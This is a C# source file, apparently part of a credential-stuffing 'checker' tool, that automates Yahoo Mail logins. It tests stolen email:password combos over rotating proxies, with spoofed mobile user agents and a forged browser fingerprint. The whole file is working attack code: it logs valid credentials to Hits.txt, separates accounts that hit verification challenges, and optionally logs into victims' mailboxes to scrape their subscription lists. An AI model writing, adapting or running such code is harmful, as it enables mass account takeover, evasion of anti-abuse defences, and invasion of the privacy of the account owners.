using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Text.RegularExpressions;


namespace Mailify
{
	internal class Yahoo_3
	{
		public static int proxyTimeout { get; set; } = 7000;
		public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

		public static readonly object objsafe = new object();

		public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
		{
			proxyTimeout = _proxyTimeout;
			proxyType = _proxyType;

			new Thread(() => Variables.Mail_Mode_Title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();

            Thread.Sleep(-1);

		}
        static void Worker(string combo)
		{
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var req = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    req.Proxy.ConnectTimeout = proxyTimeout;
                    req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));

                    string text4 = WebUtility.UrlEncode(credentials[1] ?? "");
                    string text5 = WebUtility.UrlEncode(credentials[0] ?? "");
                    req.AddHeader("Connection", "keep-alive");
                    req.AddHeader("Upgrade-Insecure-Requests", "1");
                    req.AddHeader("User-Agent", "Mozilla/5.0 (Linux; Android 5.1.1; SM-G965N Build/R16NW.G965NKSU1ARC7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36");
                    req.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3");
                    req.AddHeader("Accept-Encoding", "gzip, deflate");
                    req.AddHeader("Accept-Language", "en-US,en;q=0.9");
                    req.AddHeader("X-Requested-With", "com.yahoo.mobile.client.android.mail");
                    string input = req.Get("https://login.yahoo.com/?done=https%3A%2F%2Fapi.login.yahoo.com%2Foauth2%2Frequest_auth%3Fappid%3Dcom.yahoo.mobile.client.android.mail%26appsrcv%3D6.8.5%26src%3Dandroidphnx%26srcv%3D8.7.2%26intl%3Dus%26language%3Den-US%26sdk-device-id%3DODg2ODI4MDJlNGJlYzk4MjBkOTc5ZWRiMTA1Y2MyYWI1NWY1ZWU0Yjgz%26push%3D1%26.asdk_embedded%3D1%26theme%3Dlight%26redirect_uri%3Dcom.yahoo.mobile.client.android.mail%253A%252F%252Fphoenix%252Fcallback_auth%26client_id%3DnkjqLcZOZkjomfDS%26response_type%3Dcode%26state%3DZliubzGgAP1vTQu2UDaFuQ%26scope%3Dsdct-w%2520mail-w%2520sdpp-w%2520openid%2520device_sso%26code_challenge%3D2sP2GFXmZO5SN7yfyoK7DQIVWXb6UU19D_kmrwtG6DI%26code_challenge_method%3DS256%26nonce%3D9zH8cvQvM5tJDXWkw3rItI68TXAr3O13%26webview%3D1%26.scrumb%3D0&src=androidphnx&crumb=YhP68XDbqj4&redirect_uri=com.yahoo.mobile.client.android.mail%3A%2F%2Fphoenix%2Fcallback_auth&lang=en-US&intl=us&theme=light&add=1&client_id=nkjqLcZOZkjomfDS&appsrc=ymobilemail&appid=com.yahoo.mobile.client.android.mail&appsrcv=6.8.5&language=en-US&srcv=8.7.2&.asdk_embedded=1").ToString();
                    string text6 = Functions.LR(input, "<input type=\"hidden\" name=\"acrumb\" value=\"", "\"").FirstOrDefault();
                    string text7 = Functions.LR(input, "<input type=\"hidden\" name=\"sessionIndex\" value=\"", "\"").FirstOrDefault();
                    req.AddHeader("Connection", "keep-alive");
                    req.AddHeader("Origin", "https://login.yahoo.com");
                    req.AddHeader("X-Requested-With", "XMLHttpRequest");
                    req.AddHeader("User-Agent", "Mozilla/5.0 (Linux; Android 5.1.1; SM-G965N Build/R16NW.G965NKSU1ARC7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36");
                    req.AddHeader("content-type", "application/x-www-form-urlencoded; charset=UTF-8");
                    req.AddHeader("Accept", "*/*");
                    req.AddHeader("Referer", "https://login.yahoo.com/?done=https%3A%2F%2Fapi.login.yahoo.com%2Foauth2%2Frequest_auth%3Fappid%3Dcom.yahoo.mobile.client.android.mail%26appsrcv%3D6.8.5%26src%3Dandroidphnx%26srcv%3D8.7.2%26intl%3Dus%26language%3Den-US%26sdk-device-id%3DODg2ODI4MDJlNGJlYzk4MjBkOTc5ZWRiMTA1Y2MyYWI1NWY1ZWU0Yjgz%26push%3D1%26.asdk_embedded%3D1%26theme%3Dlight%26redirect_uri%3Dcom.yahoo.mobile.client.android.mail%253A%252F%252Fphoenix%252Fcallback_auth%26client_id%3DnkjqLcZOZkjomfDS%26response_type%3Dcode%26state%3DZliubzGgAP1vTQu2UDaFuQ%26scope%3Dsdct-w%2520mail-w%2520sdpp-w%2520openid%2520device_sso%26code_challenge%3D2sP2GFXmZO5SN7yfyoK7DQIVWXb6UU19D_kmrwtG6DI%26code_challenge_method%3DS256%26nonce%3D9zH8cvQvM5tJDXWkw3rItI68TXAr3O13%26webview%3D1%26.scrumb%3D0&src=androidphnx&crumb=YhP68XDbqj4&redirect_uri=com.yahoo.mobile.client.android.mail%3A%2F%2Fphoenix%2Fcallback_auth&lang=en-US&intl=us&theme=light&add=1&client_id=nkjqLcZOZkjomfDS&appsrc=ymobilemail&appid=com.yahoo.mobile.client.android.mail&appsrcv=6.8.5&language=en-US&srcv=8.7.2&.asdk_embedded=1");
                    req.AddHeader("Accept-Encoding", "gzip, deflate");
                    req.AddHeader("Accept-Language", "en-US,en;q=0.9");
                    string text8 = req.Post("https://login.yahoo.com/?done=https%3A%2F%2Fapi.login.yahoo.com%2Foauth2%2Frequest_auth%3Fappid%3Dcom.yahoo.mobile.client.android.mail%26appsrcv%3D6.8.5%26src%3Dandroidphnx%26srcv%3D8.7.2%26intl%3Dus%26language%3Den-US%26sdk-device-id%3DODg2ODI4MDJlNGJlYzk4MjBkOTc5ZWRiMTA1Y2MyYWI1NWY1ZWU0Yjgz%26push%3D1%26.asdk_embedded%3D1%26theme%3Dlight%26redirect_uri%3Dcom.yahoo.mobile.client.android.mail%253A%252F%252Fphoenix%252Fcallback_auth%26client_id%3DnkjqLcZOZkjomfDS%26response_type%3Dcode%26state%3DZliubzGgAP1vTQu2UDaFuQ%26scope%3Dsdct-w%2520mail-w%2520sdpp-w%2520openid%2520device_sso%26code_challenge%3D2sP2GFXmZO5SN7yfyoK7DQIVWXb6UU19D_kmrwtG6DI%26code_challenge_method%3DS256%26nonce%3D9zH8cvQvM5tJDXWkw3rItI68TXAr3O13%26webview%3D1%26.scrumb%3D0&src=androidphnx&crumb=" + text6 + "&redirect_uri=com.yahoo.mobile.client.android.mail%3A%2F%2Fphoenix%2Fcallback_auth&lang=en-US&intl=us&theme=light&add=1&client_id=nkjqLcZOZkjomfDS&appsrc=ymobilemail&appid=com.yahoo.mobile.client.android.mail&appsrcv=6.8.5&language=en-US&srcv=8.7.2&.asdk_embedded=1", "acrumb=" + text6 + "&sessionIndex=" + text7 + "&username=" + credentials[0] + "&passwd=&signin=Next&persistent=y", "application/x-www-form-urlencoded; charset=UTF-8").ToString();
                    if (text8.Contains("location\":\""))
                    {
                        string str = Functions.LR(text8, "location\":\"", "\"").FirstOrDefault();
                        req.AllowAutoRedirect = false;
                        req.AddHeader("Origin", "https://login.yahoo.com");
                        req.AddHeader("Accept-Encoding", "gzip, deflate, br");
                        req.AddHeader("Connection", "keep-alive");
                        req.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                        req.AddHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1");
                        req.AddHeader("Referer", "https://login.yahoo.com/");
                        req.AddHeader("Accept-Language", "en-us");
                        HttpResponse httpResponse = req.Post("https://login.yahoo.com" + str, "browser-fp-data=%7B%22language%22%3A%22en-gb%22%2C%22colorDepth%22%3A32%2C%22deviceMemory%22%3A%22unknown%22%2C%22pixelRatio%22%3A2%2C%22hardwareConcurrency%22%3A%22unknown%22%2C%22timezoneOffset%22%3A-120%2C%22timezone%22%3A%22Europe%2FZagreb%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22iPhone%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A0%2C%22hash%22%3A%2224700f9f1986800ab4fcc880530dd0ed%22%7D%2C%22canvas%22%3A%22canvas+winding%3Ayes%7Ecanvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Apple+Inc.%7EApple+GPU%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A1%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A5%2C%22event%22%3A1%2C%22start%22%3A1%7D%2C%22fonts%22%3A%7B%22count%22%3A13%2C%22hash%22%3A%22ef5cebb772562bd1af018f7f69d53c9e%22%7D%2C%22audio%22%3A%2235.10893253237009%22%2C%22resolution%22%3A%7B%22w%22%3A%22375%22%2C%22h%22%3A%22667%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22667%22%2C%22h%22%3A%22375%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1602267366727%2C%22render%22%3A1602267367187%7D%7D&crumb=u59YPxnhpU4&acrumb=" + text6 + "&sessionIndex=" + text7 + "&displayName=" + text5 + "&passwordContext=normal&password=" + text4 + "&verifyPassword=Next", "application/x-www-form-urlencoded");
                        string text9 = httpResponse.ToString();
                        string text10 = Functions.LR(httpResponse["Location"].ToString(), "", "").FirstOrDefault();
                        if (text9.Contains("Redirecting to <a href=\"https://api.login.yahoo.com/oauth2/request_auth") && !text9.Contains("Redirecting to <a href=\"/account/challenge/password"))
                        {
                            if (Convert.ToBoolean(Config.Capture_Subscriptions) == true)
                            {
                                req.ClearAllHeaders();
                                req.AllowAutoRedirect = false;
                                req.AddHeader("user-agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/18C66 Safari/604.1");
                                req.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                                req.AddHeader("accept-language", "ach,en-GB;q=0.8,en-US;q=0.5,en;q=0.3");
                                req.AddHeader("accept-encoding", "br, gzip, deflate");
                                req.AddHeader("dnt", "1");
                                req.AddHeader("upgrade-insecure-requests", "1");
                                string pre = req.Get("https://mail.yahoo.com/m/?.src=ym&reason=mobile").ToString();

                                var MBOXID = Functions.LR(pre, "\"selectedMailbox\":{\"id\":\"", "\"").FirstOrDefault();
                                var WSSID = Functions.LR(pre, "\"mailWssid\":\"", "\"").FirstOrDefault();
                                var APPID = Functions.LR(pre, "\"appId\":\"", "\"").FirstOrDefault();
                                var YMREQID = Guid.NewGuid().ToString();
                                var EMAIL = WebUtility.UrlEncode(credentials[0]);

                                req.ClearAllHeaders();
                                req.AllowAutoRedirect = false;
                                req.AddHeader("user-agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/18C66 Safari/604.1");
                                req.AddHeader("accept", "application/json");
                                req.AddHeader("accept-language", "ach,en-GB;q=0.8,en-US;q=0.5,en;q=0.3");
                                req.AddHeader("accept-encoding", "gzip, deflate, br");
                                req.AddHeader("referer", "https://mail.yahoo.com/");
                                req.AddHeader("origin", "https://mail.yahoo.com");
                                req.AddHeader("dnt", "1");
                                string capture_subs = req.Get($"https://data.mail.yahoo.com/f/subscription/email/brand?acctid=1&mboxid={MBOXID}&wssid={WSSID}&appid={APPID}&ymreqid={YMREQID}&email={EMAIL}&sort=score.desc").ToString();

                                var subcount = Functions.JSON(capture_subs, "count").FirstOrDefault();
                                var subs = string.Join(Environment.NewLine, Functions.LR(capture_subs, "\"name\":\"", "\",\"score\":", true));


                                Variables.Valid++;
                                Variables.Checked++;
                                Variables.cps++;
                                lock (Variables.WriteLock)
                                {
                                    Variables.remove(combo);
                                    if (Config.kekr_UI == "LOG")
                                    {
                                        Console.WriteLine($"[+] {combo}", Color.Green);
                                    }
                                    File.AppendAllText(Variables.results + "Hits.txt", combo + Environment.NewLine);
                                    File.AppendAllText(Variables.subcaps + $"[Sub Captured].txt", "------------------------------------------" + Environment.NewLine + combo + Environment.NewLine + "====================SUBS==================" + Environment.NewLine + subs + Environment.NewLine + Environment.NewLine);
                                }
                            }
                            else
                            {
                                Variables.Valid++;
                                Variables.Checked++;
                                Variables.cps++;
                                lock (Variables.WriteLock)
                                {
                                    Variables.remove(combo);
                                    if (Config.kekr_UI == "LOG")
                                    {
                                        Console.WriteLine($"[+] {combo}", Color.Green);
                                    }
                                    File.AppendAllText(Variables.results + "Hits.txt", combo + Environment.NewLine);
                                }
                            }
                        }
                        else if (!text9.Contains("/account/challenge/password") && !text9.Contains("Redirecting to <a href=\"/account/challenge/fail"))
                        {
                            if (!text10.Contains("https://login.yahoo.com/account/challenge/email-verify") && !text10.Contains("https://login.yahoo.com/account/challenge/push") && !text9.Contains("Redirecting to <a href=\"/account/challenge/challenge-selector"))
                            {
                                Variables.Invalid++;
                                Variables.Checked++;
                                Variables.cps++;
                                lock (Variables.WriteLock)
                                {
                                    Variables.remove(combo);
                                }
                            }
                            else
                            {
                                Variables.Custom++;
                                Variables.Checked++;
                                Variables.cps++;
                                lock (Variables.WriteLock)
                                {
                                    Variables.remove(combo);
                                    File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                                }
                            }
                        }
                        else
                        {
                            Variables.combos.Enqueue(combo);
                            Variables.proxyIndex++;
                            Variables.Errors++;
                        }
                    }
                    else if (!text8.Contains("error\":\"messages.INVALID_USERNAME"))
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }
                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
		}
	}
}